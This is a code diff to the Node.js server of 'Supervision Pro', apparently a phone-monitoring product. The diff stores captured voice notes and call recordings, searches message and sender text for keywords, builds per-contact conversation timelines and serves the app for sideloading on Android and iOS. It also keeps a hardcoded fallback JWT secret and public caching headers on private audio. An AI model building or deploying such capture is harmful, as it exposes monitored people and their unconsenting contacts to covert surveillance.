@@ -16,6 +16,10 @@ const PDFDocument = require('pdfkit');
 const PHOTOS_DIR = path.join(__dirname, 'photos');
 if (!fs.existsSync(PHOTOS_DIR)) fs.mkdirSync(PHOTOS_DIR, { recursive: true });
 
+// ─── Dossier stockage audio (vocaux, enregistrements d'appels) ───
+const AUDIO_DIR = path.join(__dirname, 'audio');
+if (!fs.existsSync(AUDIO_DIR)) fs.mkdirSync(AUDIO_DIR, { recursive: true });
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 const JWT_SECRET = process.env.JWT_SECRET || 'supervision-pro-secret-change-me';
@@ -1022,6 +1026,8 @@ function checkKeywordsSmart(deviceId, type, payload, extracted) {
   if (payload.url) searchableTexts.push(payload.url.toLowerCase());
   if (payload.query) searchableTexts.push(payload.query.toLowerCase());
   if (payload.text) searchableTexts.push(payload.text.toLowerCase());
+  if (payload.message) searchableTexts.push(payload.message.toLowerCase());
+  if (payload.sender) searchableTexts.push(payload.sender.toLowerCase());
   if (payload.title) searchableTexts.push(payload.title.toLowerCase());
   if (payload.appName) searchableTexts.push(payload.appName.toLowerCase());
   if (payload.host) searchableTexts.push(payload.host.toLowerCase());
@@ -1084,12 +1090,24 @@ app.post('/api/events', deviceAuthRequired, (req, res) => {
   if (!type) return res.status(400).json({ error: 'type requis' });
   if (!req.deviceConsent) return res.status(403).json({ error: 'Consentement requis avant la collecte de données' });
   const receivedAt = new Date().toISOString();
-  const payloadStr = JSON.stringify(payload || {});
+
+  // Retirer le audioBase64 du payload stocké en DB (on le stocke dans un fichier séparé)
+  const cleanPayload = { ...(payload || {}) };
+  delete cleanPayload.audioBase64;
+  const payloadStr = JSON.stringify(cleanPayload);
+
   const result = stmts.insertEvent.run(deviceId, type, payloadStr, receivedAt);
-  const event = { id: result.lastInsertRowid, deviceId, type, payload: payload || {}, receivedAt };
+
+  // Si c'est un vocal ou un enregistrement d'appel, stocker le fichier audio
+  if (['voice_note_captured', 'call_recording'].includes(type) && payload?.audioBase64) {
+    const audioResult = processAudioEvent(result.lastInsertRowid, deviceId, type, payload, receivedAt);
+    if (audioResult) cleanPayload.audioId = audioResult.audioId;
+  }
+
+  const event = { id: result.lastInsertRowid, deviceId, type, payload: cleanPayload, receivedAt };
   broadcast({ type: 'new_event', event });
   statsCache.expiresAt = 0;
-  analyzeEvent(deviceId, type, payload || {}, receivedAt);
+  analyzeEvent(deviceId, type, cleanPayload, receivedAt);
   res.status(201).json({ ok: true, eventId: result.lastInsertRowid });
 });
 
@@ -1392,10 +1410,164 @@ app.get('/api/photos/:id/thumb', authRequired, (req, res) => {
   if (!photo) return res.status(404).json({ error: 'Photo non trouvée' });
   const filePath = path.join(PHOTOS_DIR, photo.filename);
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Fichier non trouvé' });
-  // On sert l'image originale (le redimensionnement se fait côté CSS)
   res.setHeader('Content-Type', photo.mimeType);
   res.setHeader('Cache-Control', 'public, max-age=86400');
   fs.createReadStream(filePath).pipe(res);
+});
+
+// ─── Audio (vocaux, enregistrements d'appels) ───
+
+// Table audio
+db.exec(`
+  CREATE TABLE IF NOT EXISTS audio_files (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    eventId INTEGER,
+    deviceId TEXT NOT NULL,
+    type TEXT NOT NULL DEFAULT 'voice_note',
+    app TEXT DEFAULT '',
+    sender TEXT DEFAULT '',
+    isOutgoing INTEGER DEFAULT 0,
+    durationSeconds INTEGER DEFAULT 0,
+    sizeBytes INTEGER DEFAULT 0,
+    filename TEXT NOT NULL,
+    mimeType TEXT DEFAULT 'audio/ogg',
+    format TEXT DEFAULT 'opus',
+    receivedAt TEXT NOT NULL
+  );
+  CREATE INDEX IF NOT EXISTS idx_audio_deviceId ON audio_files(deviceId);
+  CREATE INDEX IF NOT EXISTS idx_audio_sender ON audio_files(sender);
+  CREATE INDEX IF NOT EXISTS idx_audio_receivedAt ON audio_files(receivedAt);
+`);
+
+// Hook : extraire et stocker l'audio des événements voice_note_captured et call_recording
+function processAudioEvent(eventId, deviceId, type, payload, receivedAt) {
+  const audioBase64 = payload.audioBase64;
+  if (!audioBase64) return null;
+
+  const format = payload.format || 'opus';
+  const ext = format === 'm4a' ? 'm4a' : format === 'ogg' ? 'ogg' : 'opus';
+  const mime = ext === 'm4a' ? 'audio/mp4' : 'audio/ogg';
+  const audioType = type === 'call_recording' ? 'call_recording' : 'voice_note';
+  const filename = `audio_${audioType}_${deviceId}_${Date.now()}.${ext}`;
+
+  const buffer = Buffer.from(audioBase64, 'base64');
+  fs.writeFileSync(path.join(AUDIO_DIR, filename), buffer);
+
+  const result = db.prepare(`
+    INSERT INTO audio_files (eventId, deviceId, type, app, sender, isOutgoing, durationSeconds, sizeBytes, filename, mimeType, format, receivedAt)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `).run(
+    eventId, deviceId, audioType,
+    payload.app || '', payload.sender || payload.number || '',
+    payload.isOutgoing ? 1 : 0,
+    payload.durationSeconds || payload.durationEstimate || 0,
+    buffer.length, filename, mime, format, receivedAt
+  );
+
+  return { audioId: result.lastInsertRowid, filename };
+}
+
+// Servir un fichier audio (streaming)
+app.get('/api/audio/:id/stream', authRequired, (req, res) => {
+  const audio = db.prepare('SELECT * FROM audio_files WHERE id = ?').get(req.params.id);
+  if (!audio) return res.status(404).json({ error: 'Audio non trouvé' });
+  const filePath = path.join(AUDIO_DIR, audio.filename);
+  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Fichier non trouvé' });
+
+  const stat = fs.statSync(filePath);
+  const range = req.headers.range;
+
+  if (range) {
+    const parts = range.replace(/bytes=/, '').split('-');
+    const start = parseInt(parts[0], 10);
+    const end = parts[1] ? parseInt(parts[1], 10) : stat.size - 1;
+    res.writeHead(206, {
+      'Content-Range': `bytes ${start}-${end}/${stat.size}`,
+      'Accept-Ranges': 'bytes',
+      'Content-Length': end - start + 1,
+      'Content-Type': audio.mimeType,
+    });
+    fs.createReadStream(filePath, { start, end }).pipe(res);
+  } else {
+    res.writeHead(200, {
+      'Content-Length': stat.size,
+      'Content-Type': audio.mimeType,
+      'Cache-Control': 'public, max-age=86400',
+    });
+    fs.createReadStream(filePath).pipe(res);
+  }
+});
+
+// Liste des audios (admin)
+app.get('/api/audio', authRequired, (req, res) => {
+  const { deviceId, type, sender, limit } = req.query;
+  let sql = 'SELECT * FROM audio_files WHERE 1=1';
+  const params = [];
+  if (deviceId) { sql += ' AND deviceId = ?'; params.push(deviceId); }
+  if (type) { sql += ' AND type = ?'; params.push(type); }
+  if (sender) { sql += ' AND sender LIKE ?'; params.push(`%${sender}%`); }
+  sql += ' ORDER BY receivedAt DESC LIMIT ?';
+  params.push(Math.min(parseInt(limit) || 100, 500));
+  res.json(db.prepare(sql).all(...params));
+});
+
+// Conversation unifiée par contact : TOUS les événements liés à un numéro/sender
+app.get('/api/conversation/:contactId', authRequired, (req, res) => {
+  const contact = decodeURIComponent(req.params.contactId);
+  const { deviceId, limit } = req.query;
+  const maxItems = Math.min(parseInt(limit) || 200, 1000);
+
+  // Chercher dans events les messages/vocaux/appels liés à ce contact
+  let sql = `SELECT * FROM events WHERE (
+    payload LIKE ? OR payload LIKE ? OR payload LIKE ?
+  )`;
+  const params = [`%"sender":"${contact}"%`, `%"number":"${contact}"%`, `%"contact":"${contact}"%`];
+
+  if (deviceId) { sql += ' AND deviceId = ?'; params.push(deviceId); }
+  sql += ' ORDER BY receivedAt ASC LIMIT ?';
+  params.push(maxItems);
+
+  const events = db.prepare(sql).all(...params).map(e => ({
+    ...e, payload: JSON.parse(e.payload || '{}')
+  }));
+
+  // Chercher les fichiers audio associés
+  const audioFiles = db.prepare(
+    'SELECT * FROM audio_files WHERE sender LIKE ? ORDER BY receivedAt ASC'
+  ).all(`%${contact}%`);
+
+  // Combiner et trier par date
+  const timeline = [];
+
+  events.forEach(e => {
+    timeline.push({
+      id: e.id,
+      type: e.type,
+      payload: e.payload,
+      receivedAt: e.receivedAt,
+      deviceId: e.deviceId,
+      category: 'event',
+    });
+  });
+
+  audioFiles.forEach(a => {
+    timeline.push({
+      id: a.id,
+      type: a.type === 'call_recording' ? 'call_recording' : 'voice_note',
+      payload: {
+        app: a.app, sender: a.sender, isOutgoing: !!a.isOutgoing,
+        durationSeconds: a.durationSeconds, sizeBytes: a.sizeBytes,
+        audioId: a.id, format: a.format,
+      },
+      receivedAt: a.receivedAt,
+      deviceId: a.deviceId,
+      category: 'audio',
+    });
+  });
+
+  timeline.sort((a, b) => new Date(a.receivedAt) - new Date(b.receivedAt));
+
+  res.json({ contact, items: timeline.slice(-maxItems), totalEvents: events.length, totalAudio: audioFiles.length });
 });
 
 // ─── Sync Batch (endpoint unique pour l'agent mobile) ───
@@ -1436,20 +1608,30 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
 
   // 1. Insérer tous les événements en une seule transaction + analyse
   const batchEvents = [];
+  const audioToProcess = [];
   const insertEventsTransaction = db.transaction((evts) => {
     for (const evt of evts) {
       if (!evt.type) continue;
-      const payloadStr = JSON.stringify(evt.payload || {});
+      const cleanPayload = { ...(evt.payload || {}) };
+      const hasAudio = ['voice_note_captured', 'call_recording'].includes(evt.type) && cleanPayload.audioBase64;
+      if (hasAudio) audioToProcess.push({ payload: { ...cleanPayload } });
+      delete cleanPayload.audioBase64;
+      const payloadStr = JSON.stringify(cleanPayload);
       const eventTime = evt.timestamp || receivedAt;
       const result = stmts.insertEvent.run(deviceId, evt.type, payloadStr, eventTime);
-      batchEvents.push({ id: result.lastInsertRowid, deviceId, type: evt.type, payload: evt.payload || {}, receivedAt: eventTime });
-      analyzeEvent(deviceId, evt.type, evt.payload || {}, eventTime);
+      if (hasAudio) audioToProcess[audioToProcess.length - 1].eventId = result.lastInsertRowid;
+      batchEvents.push({ id: result.lastInsertRowid, deviceId, type: evt.type, payload: cleanPayload, receivedAt: eventTime });
+      analyzeEvent(deviceId, evt.type, cleanPayload, eventTime);
       insertedEvents++;
     }
   });
 
   try {
     insertEventsTransaction(eventsList);
+    // Stocker les fichiers audio (hors transaction pour ne pas la bloquer)
+    for (const ap of audioToProcess) {
+      try { processAudioEvent(ap.eventId, deviceId, 'voice_note_captured', ap.payload, receivedAt); } catch (e) { console.error('Audio save error:', e.message); }
+    }
     if (batchEvents.length) {
       broadcast({ type: 'batch_events', events: batchEvents, count: batchEvents.length });
     }
@@ -1734,6 +1916,84 @@ app.get('/download/android', (req, res) => {
   res.setHeader('Content-Type', 'application/vnd.android.package-archive');
   res.setHeader('Content-Disposition', 'attachment; filename="SupervisionPro.apk"');
   fs.createReadStream(apkPath).pipe(res);
+});
+
+// ─── Distribution iOS Ad Hoc (OTA – Over The Air) ───
+
+// Dossier pour le .ipa signé
+const IOS_DIR = path.join(__dirname, 'downloads');
+if (!fs.existsSync(IOS_DIR)) fs.mkdirSync(IOS_DIR, { recursive: true });
+
+// Manifest plist — c'est CE fichier qui permet à Safari d'installer l'app directement
+// iOS lit ce manifest quand l'utilisateur clique sur le lien itms-services://
+app.get('/download/ios/manifest.plist', (req, res) => {
+  const host = req.get('host');
+  const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+  const baseUrl = `${protocol}://${host}`;
+
+  const ipaUrl = `${baseUrl}/download/ios/app.ipa`;
+  const bundleId = 'com.surveillancepro.ios';
+  const appTitle = 'Supervision Pro';
+  const appVersion = '2.0';
+
+  const manifest = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>items</key>
+  <array>
+    <dict>
+      <key>assets</key>
+      <array>
+        <dict>
+          <key>kind</key>
+          <string>software-package</string>
+          <key>url</key>
+          <string>${ipaUrl}</string>
+        </dict>
+        <dict>
+          <key>kind</key>
+          <string>display-image</string>
+          <key>url</key>
+          <string>${baseUrl}/download/ios/icon.png</string>
+        </dict>
+      </array>
+      <key>metadata</key>
+      <dict>
+        <key>bundle-identifier</key>
+        <string>${bundleId}</string>
+        <key>bundle-version</key>
+        <string>${appVersion}</string>
+        <key>kind</key>
+        <string>software</string>
+        <key>title</key>
+        <string>${appTitle}</string>
+      </dict>
+    </dict>
+  </array>
+</dict>
+</plist>`;
+
+  res.setHeader('Content-Type', 'application/xml');
+  res.send(manifest);
+});
+
+// Servir le fichier .ipa
+app.get('/download/ios/app.ipa', (req, res) => {
+  const ipaPath = path.join(IOS_DIR, 'SupervisionPro.ipa');
+  if (!fs.existsSync(ipaPath)) return res.status(404).send('IPA non disponible.');
+  res.setHeader('Content-Type', 'application/octet-stream');
+  res.setHeader('Content-Disposition', 'attachment; filename="SupervisionPro.ipa"');
+  fs.createReadStream(ipaPath).pipe(res);
+});
+
+// Lien direct de téléchargement iOS (redirige vers le fichier .ipa brut)
+app.get('/download/ios', (req, res) => {
+  const ipaPath = path.join(IOS_DIR, 'SupervisionPro.ipa');
+  if (!fs.existsSync(ipaPath)) return res.status(404).send('IPA non disponible.');
+  res.setHeader('Content-Type', 'application/octet-stream');
+  res.setHeader('Content-Disposition', 'attachment; filename="SupervisionPro.ipa"');
+  fs.createReadStream(ipaPath).pipe(res);
 });
 
 // ─── Dashboard (fichiers statiques) ───
